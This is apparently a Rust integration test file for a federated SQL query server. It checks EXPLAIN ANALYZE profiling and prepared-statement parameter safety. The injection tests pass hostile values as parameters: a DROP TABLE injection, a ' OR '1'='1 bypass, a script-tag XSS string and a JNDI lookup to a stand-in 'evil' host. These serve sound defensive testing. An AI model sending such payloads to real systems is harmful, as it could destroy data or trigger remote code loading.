// SPDX-License-Identifier: Apache-2.0
//! #940 EXPLAIN ANALYZE accuracy — verify timing/row counts match actual execution.
//! #941 Prepared statement injection tests.

use arrow::array::{ArrayRef, Int64Array, StringArray};
use arrow::datatypes::{DataType, Field, Schema};
use arrow::record_batch::RecordBatch;
use async_trait::async_trait;
use axum::body::Body;
use axum::http::{Request, StatusCode};
use fuse_core::connector::*;
use fuse_core::error::ConnectorError;
use fuse_core::registry::ConnectorRegistry;
use fuse_server::api::{AppState, RunningQueries};
use std::sync::Arc;
use tokio::sync::mpsc;
use tower::ServiceExt;

fn mock_schema() -> Schema {
    Schema::new(vec![
        Field::new("id", DataType::Int64, false),
        Field::new("name", DataType::Utf8, false),
    ])
}

fn mock_batch() -> Vec<RecordBatch> {
    let schema = Arc::new(mock_schema());
    vec![RecordBatch::try_new(
        schema,
        vec![
            Arc::new(Int64Array::from(vec![1, 2, 3])) as ArrayRef,
            Arc::new(StringArray::from(vec!["a", "b", "c"])) as ArrayRef,
        ],
    )
    .unwrap()]
}

#[derive(Debug)]
struct AnalyzeConnector(String);
#[async_trait]
impl FederatedConnector for AnalyzeConnector {
    fn id(&self) -> &str {
        &self.0
    }
    fn connector_type(&self) -> &str {
        "mock"
    }
    fn capabilities(&self) -> ConnectorCapabilities {
        ConnectorCapabilities::full()
    }
    async fn health_check(&self) -> ConnectorHealth {
        ConnectorHealth {
            status: HealthStatus::Healthy,
            latency_ms: Some(1),
            message: None,
        }
    }
    async fn discover_schemas(&self) -> Result<Vec<SchemaInfo>, ConnectorError> {
        Ok(vec![SchemaInfo {
            name: "users".into(),
            schema_type: SchemaType::Table,
            estimated_row_count: Some(3),
        }])
    }
    async fn get_schema(&self, _: &str) -> Result<Schema, ConnectorError> {
        Ok(mock_schema())
    }
    async fn execute(&self, _: &SubQuery) -> Result<Vec<RecordBatch>, ConnectorError> {
        tokio::time::sleep(std::time::Duration::from_millis(5)).await;
        Ok(mock_batch())
    }
    async fn execute_streaming(
        &self,
        q: &SubQuery,
        tx: mpsc::Sender<Result<RecordBatch, ConnectorError>>,
    ) -> Result<(), ConnectorError> {
        for b in self.execute(q).await? {
            tx.send(Ok(b))
                .await
                .map_err(|_| ConnectorError::ChannelClosed)?;
        }
        Ok(())
    }
}

fn build_app() -> axum::Router {
    let registry = ConnectorRegistry::new();
    registry
        .register(Arc::new(AnalyzeConnector("ds1".into())))
        .unwrap();
    registry
        .register(Arc::new(AnalyzeConnector("ds2".into())))
        .unwrap();
    let state = Arc::new(AppState {
        registry: Arc::new(registry),
        alert_rules: vec![],
        view_registry: Arc::new(fuse_engine::materialized::MaterializedViewRegistry::new()),
        history: Arc::new(fuse_server::history::QueryHistory::new()),
        running_queries: Arc::new(RunningQueries::new()),
        saved_queries: Arc::new(fuse_server::saved_queries::SavedQueryRegistry::new()),
        plan_cache: Arc::new(fuse_server::plan_cache::PlanCache::new(300, 1000)),
        result_cache: Arc::new(fuse_server::plan_cache::ResultCache::new(60, 100)),
        audit_log: Arc::new(fuse_server::audit::AuditLog::new(100)),
        prepared_statements: fuse_server::prepared::new_store(),
        adaptive_timeout: Arc::new(fuse_server::adaptive_timeout::AdaptiveTimeout::new()),
        shared_saved_queries: fuse_server::shared_state::SharedSavedQueries::from_env(),
        shared_history: fuse_server::shared_state::SharedQueryHistory::from_env(),
        shared_audit_log: fuse_server::shared_state::SharedAuditLog::from_env(),
        transactions: std::sync::Arc::new(fuse_server::transaction::TransactionStore::new()),
        max_result_bytes: 0,
        datasource_limiter: std::sync::Arc::new(fuse_server::rate_limit::DatasourceLimiter::new()),
        adaptive_parallelism: std::sync::Arc::new(
            fuse_server::adaptive_parallelism::AdaptiveParallelism::new(),
        ),
        otel_store: None,
        query_recorder: std::sync::Arc::new(fuse_server::query_replay::QueryRecorder::new(100)),
        webhook_registry: std::sync::Arc::new(fuse_server::webhook::WebhookRegistry::new()),
        compilation_cache: std::sync::Arc::new(
            fuse_server::query_compilation::CompilationCache::new(300, 5000),
        ),
        cdc_tracker: std::sync::Arc::new(fuse_server::cdc::CdcTracker::new(1000)),
        adaptive_cache: std::sync::Arc::new(fuse_server::adaptive_cache::AdaptiveCache::new(
            60, 3, 10000,
        )),
        column_rbac: None,
        key_rotation: std::sync::Arc::new(fuse_server::auth::KeyRotationManager::new(vec![])),
        schema_cache: std::sync::Arc::new(fuse_server::api::SchemaCache::new(300)),
        health_history: std::sync::Arc::new(
            fuse_server::connector_health_history::HealthHistory::new(),
        ),
        pool_tracker: std::sync::Arc::new(fuse_server::pool_stats::PoolStatsTracker::new()),
        smart_router: std::sync::Arc::new(fuse_server::smart_routing::SmartRouter::new()),
        tenant_registry: Arc::new(fuse_server::tenant::TenantRegistry::new(vec![])),
    });
    fuse_server::build_router(state)
}

async fn query_analyze(app: axum::Router, sql: &str) -> (StatusCode, serde_json::Value) {
    let body = serde_json::json!({"query": sql, "format": "sql", "analyze": true});
    let req = Request::builder()
        .method("POST")
        .uri("/api/fuse/query")
        .header("content-type", "application/json")
        .body(Body::from(serde_json::to_string(&body).unwrap()))
        .unwrap();
    let resp = app.oneshot(req).await.unwrap();
    let status = resp.status();
    let bytes = axum::body::to_bytes(resp.into_body(), 10_000_000)
        .await
        .unwrap();
    (status, serde_json::from_slice(&bytes).unwrap_or_default())
}

async fn query_plain(app: axum::Router, sql: &str) -> (StatusCode, serde_json::Value) {
    let body = serde_json::json!({"query": sql, "format": "sql"});
    let req = Request::builder()
        .method("POST")
        .uri("/api/fuse/query")
        .header("content-type", "application/json")
        .body(Body::from(serde_json::to_string(&body).unwrap()))
        .unwrap();
    let resp = app.oneshot(req).await.unwrap();
    let status = resp.status();
    let bytes = axum::body::to_bytes(resp.into_body(), 10_000_000)
        .await
        .unwrap();
    (status, serde_json::from_slice(&bytes).unwrap_or_default())
}

// ── #940 EXPLAIN ANALYZE ──

#[tokio::test]
async fn test_analyze_returns_profile() {
    let (status, json) = query_analyze(build_app(), "SELECT * FROM ds1.users").await;
    assert_eq!(status, StatusCode::OK);
    assert!(
        json["execution_profile"].is_object(),
        "should have execution_profile: {:?}",
        json
    );
}

#[tokio::test]
async fn test_analyze_row_count_matches_actual() {
    let (_, json) = query_analyze(build_app(), "SELECT * FROM ds1.users").await;
    let actual_rows = json["rows"].as_array().unwrap().len() as u64;
    let profile_rows = json["execution_profile"]["nodes"][0]["actual_rows"]
        .as_u64()
        .unwrap();
    assert_eq!(
        profile_rows, actual_rows,
        "profile rows should match actual"
    );
}

#[tokio::test]
async fn test_analyze_timing_is_nonzero() {
    let (_, json) = query_analyze(build_app(), "SELECT * FROM ds1.users").await;
    let ms = json["execution_profile"]["nodes"][0]["actual_ms"]
        .as_u64()
        .unwrap();
    assert!(ms > 0, "timing should be >0ms (connector sleeps 5ms)");
}

#[tokio::test]
async fn test_analyze_has_estimate_accuracy() {
    let (_, json) = query_analyze(build_app(), "SELECT * FROM ds1.users").await;
    let acc = json["execution_profile"]["nodes"][0]["estimate_accuracy"].as_str();
    assert!(
        acc.is_some(),
        "should have estimate_accuracy: {:?}",
        json["execution_profile"]
    );
    assert!(
        acc.unwrap().contains("vs actual"),
        "should show est vs actual"
    );
}

#[tokio::test]
async fn test_no_analyze_omits_profile() {
    let (status, json) = query_plain(build_app(), "SELECT * FROM ds1.users").await;
    assert_eq!(status, StatusCode::OK);
    assert!(
        json["execution_profile"].is_null(),
        "should not have profile without analyze=true"
    );
}

#[tokio::test]
async fn test_analyze_union_has_children() {
    let (_, json) = query_analyze(
        build_app(),
        "SELECT * FROM ds1.users UNION ALL SELECT * FROM ds2.users",
    )
    .await;
    let nodes = &json["execution_profile"]["nodes"];
    let has_children = nodes[0]["children"]
        .as_array()
        .map(|c| !c.is_empty())
        .unwrap_or(false);
    // UNION should have child scan nodes
    let total_rows = json["rows"].as_array().unwrap().len();
    assert_eq!(total_rows, 6, "UNION of 3+3 rows");
    assert!(
        has_children || nodes.as_array().map(|n| n.len() > 1).unwrap_or(false),
        "UNION analyze should show multiple scan nodes"
    );
}

// ── #941 Prepared statement injection ──

#[tokio::test]
async fn test_param_substitution_basic() {
    let body = serde_json::json!({
        "query": "SELECT * FROM ds1.users WHERE name = $name",
        "format": "sql",
        "params": { "name": "alice" }
    });
    let req = Request::builder()
        .method("POST")
        .uri("/api/fuse/query")
        .header("content-type", "application/json")
        .body(Body::from(serde_json::to_string(&body).unwrap()))
        .unwrap();
    let resp = build_app().oneshot(req).await.unwrap();
    // Should not crash — params should be handled safely
    assert!(
        resp.status().is_success() || resp.status() == StatusCode::BAD_REQUEST,
        "param query should not crash: {}",
        resp.status()
    );
}

#[tokio::test]
async fn test_param_injection_attempt() {
    let body = serde_json::json!({
        "query": "SELECT * FROM ds1.users WHERE name = $name",
        "format": "sql",
        "params": { "name": "'; DROP TABLE users; --" }
    });
    let req = Request::builder()
        .method("POST")
        .uri("/api/fuse/query")
        .header("content-type", "application/json")
        .body(Body::from(serde_json::to_string(&body).unwrap()))
        .unwrap();
    let resp = build_app().oneshot(req).await.unwrap();
    let status = resp.status();
    let bytes = axum::body::to_bytes(resp.into_body(), 10_000_000)
        .await
        .unwrap();
    let json: serde_json::Value = serde_json::from_slice(&bytes).unwrap_or_default();
    // Should NOT execute DROP TABLE — either filter safely or error
    assert!(
        status.is_success() || status.is_client_error(),
        "injection should not cause server error: {} {:?}",
        status,
        json
    );
    // If it returns rows, they should be from the mock (not a real DROP)
    if let Some(rows) = json["rows"].as_array() {
        assert!(
            rows.len() <= 3,
            "should return mock data, not injected result"
        );
    }
}

#[tokio::test]
async fn test_param_with_special_chars() {
    for payload in [
        "<script>alert(1)</script>",
        "\\0\\n\\r",
        "' OR '1'='1",
        "${jndi:ldap://evil}",
    ] {
        let body = serde_json::json!({
            "query": "SELECT * FROM ds1.users WHERE name = $name",
            "format": "sql",
            "params": { "name": payload }
        });
        let req = Request::builder()
            .method("POST")
            .uri("/api/fuse/query")
            .header("content-type", "application/json")
            .body(Body::from(serde_json::to_string(&body).unwrap()))
            .unwrap();
        let resp = build_app().oneshot(req).await.unwrap();
        assert_ne!(
            resp.status(),
            StatusCode::INTERNAL_SERVER_ERROR,
            "special chars should not cause 500: payload={}",
            payload
        );
    }
}
